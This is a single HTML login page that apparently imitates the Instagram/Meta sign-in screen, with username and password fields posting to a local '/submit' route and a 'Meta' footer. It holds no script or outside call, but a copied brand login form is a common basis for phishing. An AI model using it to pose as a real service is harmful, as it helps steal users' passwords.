<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      background: linear-gradient(to bottom right, #0f0f0f, #1a1a2e);
      font-family: Arial, sans-serif;
      color: #fff;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background-color: #1c1c1e;
      padding: 40px;
      border-radius: 10px;
      text-align: center;
      width: 90%;
      max-width: 360px;
    }

    .container img {
      width: 80px;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background-color: #2c2c2e;
      border: 1px solid #444;
      border-radius: 6px;
      color: white;
    }

    input[type="submit"] {
      background-color: #0095f6;
      border: none;
      padding: 12px;
      color: white;
      width: 100%;
      font-weight: bold;
      border-radius: 6px;
      margin-top: 10px;
      cursor: pointer;
    }

    a {
      display: block;
      color: #a1a1a1;
      margin-top: 15px;
      text-decoration: none;
    }

    .meta {
      margin-top: 30px;
      color: #aaa;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <form class="container" action="/submit" method="post">
    <img src="/static/logo.png" alt="Logo">
    <input type="text" name="username" placeholder="Username, email or mobile number" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="submit" value="Log in">
    <a href="#">Forgot password?</a>
    <a href="#">Create new account</a>
    <div class="meta">Meta</div>
  </form>
</body>
</html>
